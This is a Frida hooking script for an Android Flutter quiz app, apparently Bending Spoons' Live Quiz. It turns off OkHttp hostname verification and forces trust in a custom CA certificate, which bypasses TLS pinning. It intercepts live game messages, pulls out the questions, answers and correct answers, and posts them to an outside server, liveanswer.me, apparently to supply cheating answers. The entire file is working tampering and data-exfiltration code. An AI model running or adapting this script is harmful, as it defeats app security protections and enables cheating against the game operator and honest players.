'use strict'

if (Java.available) {
  Java.perform(function() {
    console.log("[*] Script Started");
    const Client = Java.use('okhttp3.OkHttpClient');
    const RealWebSocket = Java.use('okhttp3.internal.ws.RealWebSocket$2');


    const ClientBuilder = Java.use('okhttp3.OkHttpClient$Builder');
    const RequestBuilder = Java.use('okhttp3.Request$Builder');
    const RequestBody = Java.use('okhttp3.RequestBody');
    const FormBody = Java.use('okhttp3.FormBody$Builder');
    const OkHostnameVerifier = Java.use('okhttp3.internal.tls.OkHostnameVerifier');
    const MediaType = Java.use('okhttp3.MediaType');

    const StringClass = Java.use("java.lang.String");
    const MethodCall = Java.use("io.flutter.plugin.common.MethodCall");

    //Thread
    const Thread = Java.use('java.lang.Thread');
    const Runnable = Java.use('java.lang.Runnable');

    //cert unpinning
    const CertificateFactory = Java.use("java.security.cert.CertificateFactory");
    const FileInputStream = Java.use("java.io.FileInputStream");
    const BufferedInputStream = Java.use("java.io.BufferedInputStream");
    const X509Certificate = Java.use("java.security.cert.X509Certificate");
    const KeyStore = Java.use("java.security.KeyStore");
    const TrustManagerFactory = Java.use("javax.net.ssl.TrustManagerFactory");
    const SSLContext = Java.use("javax.net.ssl.SSLContext");

    var data_global = null;
    var counter = 0;
    var full = null;
    var alreadySent = false;

    var MySend = Java.registerClass({
      name: 'com.bendingspoons.live.quiz.MySend',
      implements: [Runnable],
      methods: {
        run: function () {
          save_global();
        },
      }
    });

    var MySendResults = Java.registerClass({
      name: 'com.bendingspoons.live.quiz.MySendResults',
      implements: [Runnable],
      methods: {
        run: function () {
          sendResults();
        },
      }
    });

    function sendResults(){
      console.log('[*] sendResults');
      var clientBuilder = ClientBuilder.$new();
      var client = clientBuilder.build();
      var s = StringClass.$new(JSON.stringify(full));
      if (s != null){
        var mediaType = MediaType.parse("application/json; charset=utf-8");
        var formBody = RequestBody.create(mediaType, s);
        var request = RequestBuilder.$new().url('https://liveanswer.me:8000/addcontest').post(formBody).build();
        client.newCall(request).execute();
        console.log('sent result');
      } else {
        alreadySent = false;
      }
    }

    function toJsonResults(data){
      try{
        var jdata = JSON.parse(data);
        
        if (jdata[30] == null || jdata[30][1][23] == null || jdata[30][1][23][11] == null || jdata[30][1][23][11][15] == null)
          return null;

        var res = [];
        var i = 0;
        while (i < 12){
          var tmp = {};
          tmp['question'] = jdata[30][1][23][i][7];
          tmp['answers'] = jdata[30][1][23][i][9];
          tmp['correct'] = jdata[30][1][23][i][15];
          res.push(tmp);
          i += 1;
        }
        console.log(JSON.stringify(res));

        return res;
      }catch(e) {
        console.log('ERROR: ' + data);
      }
    }

    var oldQuestion = null;
    function toJson(data){
      var jdata = JSON.parse(data);
      
      if (jdata[30] == null || jdata[30][1][23][0] == null)
        return null;

      var res = {}
      var i = 11;
      while (jdata[30][1][23][i] == null) 
        i -= 1;
      counter = i;
      res['question'] = jdata[30][1][23][i][7];
      res['answers'] = jdata[30][1][23][i][9];

      if (oldQuestion == res['question'])
        return null;
      else
        oldQuestion = res['question']

      console.log(counter + ' : ' + JSON.stringify(res));
      return res;
    }


    function save_global(){
      console.log('[*] save_global');
      var clientBuilder = ClientBuilder.$new();
      var client = clientBuilder.build();
      var s = StringClass.$new(JSON.stringify(data_global));
      if (s != null){
        var mediaType = MediaType.parse("application/json; charset=utf-8");
        var formBody = RequestBody.create(mediaType, s);
        var request = RequestBuilder.$new().url('https://liveanswer.me:8000/addquestion').post(formBody).build();
        client.newCall(request).execute();
        console.log('sent');
      }
    }


    OkHostnameVerifier.verify.overload('java.lang.String', 'javax.net.ssl.SSLSession').implementation = function(hostname, session){
      return true;
    }


    // Load CAs from an InputStream
    var cf = CertificateFactory.getInstance("X.509");
    
    try {
        var fileInputStream = FileInputStream.$new("/data/local/tmp/liveanswer.crt");
    } catch(err) {
        console.log("[o] " + err);
    }
    
    var bufferedInputStream = BufferedInputStream.$new(fileInputStream);
    var ca = cf.generateCertificate(bufferedInputStream);
    bufferedInputStream.close();

    var certInfo = Java.cast(ca, X509Certificate);

    // Create a KeyStore containing our trusted CAs
    var keyStoreType = KeyStore.getDefaultType();
    var keyStore = KeyStore.getInstance(keyStoreType);
    keyStore.load(null, null);
    keyStore.setCertificateEntry("ca", ca);
    
    // Create a TrustManager that trusts the CAs in our KeyStore
    var tmfAlgorithm = TrustManagerFactory.getDefaultAlgorithm();
    var tmf = TrustManagerFactory.getInstance(tmfAlgorithm);
    tmf.init(keyStore);

    SSLContext.init.overload("[Ljavax.net.ssl.KeyManager;", "[Ljavax.net.ssl.TrustManager;", "java.security.SecureRandom").implementation = function(a,b,c) {
            SSLContext.init.overload("[Ljavax.net.ssl.KeyManager;", "[Ljavax.net.ssl.TrustManager;", "java.security.SecureRandom").call(this, a, tmf.getTrustManagers(), c);
    }

    MethodCall.argument.implementation = function(key){
      var ret = this.argument(key);
      //console.log(key + " -> " + ret);
      if (key == "string" && ret.toString().indexOf("currentGame") >= 0){
        //send single question/answers
        data_global = toJson(ret);
        if (data_global != null && data_global.question){
          Thread.$new(MySend.$new()).start();
        }

        //send full contest
        if (counter == 11 && !alreadySent){
          full = toJsonResults(ret);
          if (full != null){
            alreadySent = true;
            Thread.$new(MySendResults.$new()).start();
          }
        }
      }
      return ret;
    }
  });
}
